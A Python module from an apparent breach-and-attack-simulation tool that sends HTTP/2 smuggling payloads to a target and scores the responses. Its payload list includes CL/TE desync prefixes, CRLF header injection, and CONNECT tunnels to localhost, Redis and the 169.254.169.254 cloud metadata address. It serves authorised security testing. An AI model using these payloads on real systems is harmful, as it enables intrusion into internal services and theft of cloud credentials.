"""
HTTP/2 specific attack testing module.

Tests for HTTP/2 desync attacks, HPACK header injection, HTTP/2 tunnel vision,
and WebSocket upgrade smuggling. These attacks exploit differences in how
HTTP/2 front-end proxies and HTTP/1.1 back-end servers parse requests.

MITRE ATT&CK: T1190 - Exploit Public-Facing Application
"""

from __future__ import annotations

import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# HTTP/2 smuggling payloads
# Format: TECHNIQUE:description|header_overrides_json|body|notes
# These target H2->H1 downgrade desync vulnerabilities

H2_SMUGGLING_PAYLOADS = [
    # --- H2.CL Desync ---
    # HTTP/2 doesn't use Content-Length but some proxies pass it through
    # during H2->H1 downgrade, causing desync with the backend
    "H2_CL_DESYNC:CL header in H2 request (basic)|content-length:0|GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "H2_CL_DESYNC:CL mismatch smuggle prefix|content-length:5|0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "H2_CL_DESYNC:CL smuggle to internal endpoint|content-length:0|GET /internal/debug HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "H2_CL_DESYNC:CL smuggle POST with body|content-length:4|POST /api/admin/users HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\n\r\n{\"role\":\"admin\"}",

    # --- H2.TE Desync ---
    # HTTP/2 spec forbids Transfer-Encoding but some proxies don't strip it
    "H2_TE_DESYNC:TE chunked in H2 frame|transfer-encoding:chunked|0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "H2_TE_DESYNC:TE chunked smuggle to internal|transfer-encoding:chunked|0\r\n\r\nGET /internal/config HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "H2_TE_DESYNC:TE with varied capitalization|Transfer-Encoding:chunked|0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
    "H2_TE_DESYNC:TE with obfuscation|transfer-encoding: chunked |0\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\nX-Injected: true\r\n\r\n",

    # --- HPACK Header Injection ---
    # Injecting special characters via HPACK-encoded pseudo-headers
    # H2 allows header values that would be invalid in H1
    "HPACK_INJECT:CRLF in header value via H2|x-injected:value\r\nX-Evil: injected|",
    "HPACK_INJECT:Newline in host header|host:legit.com\r\nHost: evil.com|",
    "HPACK_INJECT:Null byte in header|x-test:before\x00after|",
    "HPACK_INJECT:Header value with H1 request injection|foo:bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost|",
    "HPACK_INJECT:Path pseudo-header injection|:path:/ HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin|",
    "HPACK_INJECT:Method pseudo-header injection|:method:GET / HTTP/1.1\r\nHost: evil.com\r\n\r\nDELETE|",
    "HPACK_INJECT:Scheme pseudo-header injection|:scheme:https://evil.com\r\nHost: evil.com|",
    "HPACK_INJECT:Authority pseudo-header with port|:authority:legit.com\r\nHost: internal.server|",

    # --- HTTP/2 Tunnel Vision ---
    # Exploiting HTTP/2 CONNECT or upgrade for request tunneling
    "H2_TUNNEL:CONNECT method tunneling|:method:CONNECT,:authority:internal.server:80|",
    "H2_TUNNEL:CONNECT to localhost|:method:CONNECT,:authority:127.0.0.1:80|",
    "H2_TUNNEL:CONNECT to metadata endpoint|:method:CONNECT,:authority:169.254.169.254:80|",
    "H2_TUNNEL:CONNECT to internal Redis|:method:CONNECT,:authority:127.0.0.1:6379|",
    "H2_TUNNEL:Extended CONNECT for websocket|:method:CONNECT,:protocol:websocket,:path:/internal/ws|",

    # --- WebSocket Upgrade Smuggling via H2 ---
    # Using HTTP/2 extended CONNECT to bypass WebSocket origin checks
    "H2_WS_SMUGGLE:WebSocket upgrade via H2|upgrade:websocket,connection:upgrade,sec-websocket-version:13,sec-websocket-key:dGVzdA==|",
    "H2_WS_SMUGGLE:H2 to WS with origin bypass|upgrade:websocket,origin:http://trusted.com,sec-websocket-version:13,sec-websocket-key:dGVzdA==|",
    "H2_WS_SMUGGLE:H2 to WS smuggle to internal|upgrade:websocket,host:internal.server,sec-websocket-version:13,sec-websocket-key:dGVzdA==|",

    # --- H2 Request Splitting ---
    # Exploiting pseudo-header handling differences
    "H2_SPLIT:Duplicate host headers|host:target.com,host:internal.com|",
    "H2_SPLIT:Conflicting authority and host|:authority:target.com,host:internal.server|",
    "H2_SPLIT:Path with fragment injection|:path:/search?q=test#/../admin|",
    "H2_SPLIT:Path with encoded traversal|:path:/%2e%2e/admin|",
    "H2_SPLIT:Path absolute form injection|:path:http://internal.server/admin|",
]


class HTTP2SmugglingModule(BaseAttackModule):
    """
    HTTP/2 specific attack testing.

    Tests for vulnerabilities unique to HTTP/2 implementations:
    - H2.CL desync: Content-Length smuggling through H2-to-H1 downgrade
    - H2.TE desync: Transfer-Encoding smuggling via H2 (RFC violation)
    - HPACK header injection: Special chars in HPACK-encoded headers
    - HTTP/2 tunnel vision: CONNECT method abuse for internal access
    - WebSocket upgrade smuggling: Bypassing origin checks via H2
    - Request splitting: Pseudo-header manipulation

    These attacks target the impedance mismatch between HTTP/2 front-end
    proxies/CDNs and HTTP/1.1 backend servers.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="http2_smuggling",
            description="HTTP/2 desync, HPACK injection, tunnel vision, WebSocket upgrade smuggling",
            category="http2_smuggling",
            mitre_technique_ids=["T1190"],
            mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.STANDARD,
            owasp_category="A05:2021 - Security Misconfiguration",
            cwe_ids=["CWE-444", "CWE-113", "CWE-436"],
            tags=["http2", "h2", "smuggling", "desync", "hpack", "tunnel"],
        )

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        payloads = list(H2_SMUGGLING_PAYLOADS)

        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("http2_smuggling", limit=50)
            if db_payloads:
                payloads.extend(db_payloads)

        return payloads

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        base_path = options.get("path", "/")

        for payload in payloads:
            parts = payload.split(":", 1)
            technique = parts[0] if len(parts) > 1 else "UNKNOWN"
            detail_str = parts[1] if len(parts) > 1 else parts[0]

            segments = detail_str.split("|")
            description = segments[0] if len(segments) > 0 else ""
            header_str = segments[1] if len(segments) > 1 else ""
            body = segments[2] if len(segments) > 2 else ""

            # Parse the header overrides
            headers = {
                "X-BAS-Payload": payload,
                "X-BAS-Attack-Type": technique,
                "X-BAS-Description": description,
            }

            # Determine method and path based on technique
            method = "POST" if body else "GET"
            path = base_path

            if header_str:
                for h_pair in header_str.split(","):
                    if ":" in h_pair:
                        h_key, h_val = h_pair.split(":", 1)
                        h_key = h_key.strip()
                        h_val = h_val.strip()
                        # Pseudo-headers become metadata
                        if h_key.startswith(":"):
                            if h_key == ":method":
                                method = h_val.split()[0] if " " not in h_val else h_val
                            elif h_key == ":path":
                                path = h_val
                            elif h_key == ":authority":
                                headers["Host"] = h_val
                            else:
                                headers[f"X-BAS-H2-{h_key}"] = h_val
                        else:
                            headers[h_key] = h_val

            req_id = uuid.uuid4().hex[:8]

            # For tunnel/CONNECT techniques, use POST to simulate
            if technique == "H2_TUNNEL" and method == "CONNECT":
                method = "POST"
                headers["X-BAS-H2-Method"] = "CONNECT"

            requests.append(AttackRequest(
                request_id=f"h2smug-{req_id}",
                target=target,
                method=method if method in ("GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD") else "POST",
                path=path if not path.startswith("http") else base_path,
                body=body if body else None,
                headers=headers,
                timeout=options.get("timeout", 30.0),
            ))

        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text
        attack_type = request.headers.get("X-BAS-Attack-Type", "UNKNOWN")
        payload_used = request.headers.get("X-BAS-Payload", payload)
        description = request.headers.get("X-BAS-Description", "")

        severity_map = {
            "H2_CL_DESYNC": "critical",
            "H2_TE_DESYNC": "critical",
            "HPACK_INJECT": "high",
            "H2_TUNNEL": "critical",
            "H2_WS_SMUGGLE": "high",
            "H2_SPLIT": "high",
        }

        # Desync detection via timing anomaly (response took too long = queued second request)
        if attack_type in ("H2_CL_DESYNC", "H2_TE_DESYNC") and response.elapsed_ms > 10000:
            return ModuleResult(
                module_name="http2_smuggling",
                target=request.target,
                status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload_used,
                response_code=response.status_code,
                response_body_preview=body[:500],
                elapsed_ms=response.elapsed_ms,
                evidence=(
                    f"HTTP/2 desync: {description} - response delayed "
                    f"({response.elapsed_ms:.0f}ms), possible request queuing"
                ),
                severity=severity_map.get(attack_type, "high"),
                mitre_technique_id="T1190",
                detail={"detection_type": f"h2_{attack_type.lower()}", "attack_type": attack_type},
            )

        # Desync detection via content that shouldn't be in the response
        smuggle_indicators = [
            ("admin", "Admin content returned via smuggled request"),
            ("internal", "Internal content exposed via H2 smuggle"),
            ("debug", "Debug endpoint accessible via H2 smuggle"),
            ("config", "Configuration data exposed via H2 smuggle"),
            ("root:x:0", "System file accessible via H2 smuggle"),
        ]
        if attack_type in ("H2_CL_DESYNC", "H2_TE_DESYNC", "H2_SPLIT"):
            for indicator, desc in smuggle_indicators:
                if indicator.lower() in body.lower() and response.status_code == 200:
                    return ModuleResult(
                        module_name="http2_smuggling",
                        target=request.target,
                        status=VulnStatus.POTENTIALLY_VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"HTTP/2 desync: {desc} - '{indicator}' in response body",
                        severity=severity_map.get(attack_type, "high"),
                        mitre_technique_id="T1190",
                        detail={"detection_type": "smuggled_content", "attack_type": attack_type},
                    )

        # HPACK injection detection - headers reflected in response
        if attack_type == "HPACK_INJECT":
            injection_indicators = [
                "x-evil", "x-injected", "injected",
            ]
            for indicator in injection_indicators:
                # Check if injected header appears in response headers
                resp_headers_str = str(response.headers).lower()
                if indicator in resp_headers_str:
                    return ModuleResult(
                        module_name="http2_smuggling",
                        target=request.target,
                        status=VulnStatus.VULNERABLE,
                        payload_used=payload_used,
                        response_code=response.status_code,
                        response_body_preview=body[:500],
                        elapsed_ms=response.elapsed_ms,
                        evidence=f"HPACK injection: injected header '{indicator}' reflected in response",
                        severity="high",
                        mitre_technique_id="T1190",
                        detail={"detection_type": "hpack_injection", "attack_type": attack_type},
                    )

        # Tunnel vision detection - successful CONNECT to internal service
        if attack_type == "H2_TUNNEL":
            if response.status_code == 200:
                return ModuleResult(
                    module_name="http2_smuggling",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"HTTP/2 tunnel: CONNECT method accepted - {description}",
                    severity="critical",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "h2_tunnel", "attack_type": attack_type},
                )

        # WebSocket smuggle detection
        if attack_type == "H2_WS_SMUGGLE":
            if response.status_code == 101:
                return ModuleResult(
                    module_name="http2_smuggling",
                    target=request.target,
                    status=VulnStatus.VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"HTTP/2 WebSocket smuggling: upgrade accepted - {description}",
                    severity="high",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "h2_ws_smuggle", "attack_type": attack_type},
                )

        # Check for protocol-level error messages that reveal H2 processing
        h2_error_indicators = [
            ("PROTOCOL_ERROR", "H2 protocol error exposed - proxy may be vulnerable to H2 attacks"),
            ("FRAME_SIZE_ERROR", "H2 frame size error - proxy reveals H2 implementation details"),
            ("FLOW_CONTROL_ERROR", "H2 flow control error exposed"),
            ("h2_error", "H2 error message in response"),
            ("HTTP2", "HTTP/2 implementation details exposed"),
            ("nghttp2", "nghttp2 library details exposed"),
        ]
        for indicator, desc in h2_error_indicators:
            if indicator.lower() in body.lower():
                return ModuleResult(
                    module_name="http2_smuggling",
                    target=request.target,
                    status=VulnStatus.POTENTIALLY_VULNERABLE,
                    payload_used=payload_used,
                    response_code=response.status_code,
                    response_body_preview=body[:500],
                    elapsed_ms=response.elapsed_ms,
                    evidence=f"HTTP/2 info leak: {desc}",
                    severity="low",
                    mitre_technique_id="T1190",
                    detail={"detection_type": "h2_info_leak", "attack_type": attack_type},
                )

        return ModuleResult(
            module_name="http2_smuggling",
            target=request.target,
            status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload_used,
            response_code=response.status_code,
            elapsed_ms=response.elapsed_ms,
            detail={"attack_type": attack_type},
        )
